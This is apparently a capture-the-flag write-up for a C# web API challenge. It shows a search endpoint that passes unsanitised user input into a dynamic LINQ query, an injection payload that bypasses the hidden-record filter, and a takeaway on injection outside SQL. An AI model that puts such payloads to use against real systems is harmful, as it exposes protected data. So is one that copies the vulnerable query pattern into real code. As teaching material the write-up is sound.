# postapi

## Solution

Looking at the `search` endpoint, we see that user input is put verbatim into a LINQ query, using dynamic LINQ, without any sanitation.

```csharp
app.MapGet("/search", ([FromQuery] string? query, PostcodeDb db) => {
    if (query == null)
        query = "";
    return db.Postcodes.Where(String.Format("Hidden == false && (Name.Contains(\"{0}\"))", query)).ToList();
});
```

As this is a dynamic LINQ query, we can inject any querying logic (limited
subset of C#) into the query. As dynamic LINQ does not support comments, we
need to make sure that the query is valid after injection.

As we, most likely, want to see a hidden postcode and keeping in mind that
extra pair of parentheses in the query, we can inject the payload

```csharp
")) or Hidden==True or Name=(("
```

making the query, after injection

```csharp
"Hidden == false && (Name.Contains("")) or Hidden==True or Name=((""))"
```

## Takeaway

It's not just when dealing with SQL when we have to be careful about injection
attacks. Injection attacks can happen wherever user input is put into any
interpreted context. We, therefore, must take care to identify what is an
interpreted context and also what is unsafe input (user input).
